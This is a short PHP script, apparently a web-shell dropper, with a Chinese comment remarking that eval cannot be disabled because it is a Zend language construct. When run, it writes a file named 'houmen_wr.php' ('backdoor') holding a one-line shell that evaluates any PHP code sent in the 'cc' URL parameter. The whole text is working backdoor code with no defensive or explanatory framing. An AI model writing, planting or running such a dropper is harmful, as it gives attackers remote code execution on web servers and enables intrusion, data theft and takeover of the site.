<?php
# eval($php_code);//无法禁用eval, 是zend的结构体
fputs(fopen('houmen_wr.php','w'),'<?php eval($_GET[cc])?>'); 
?>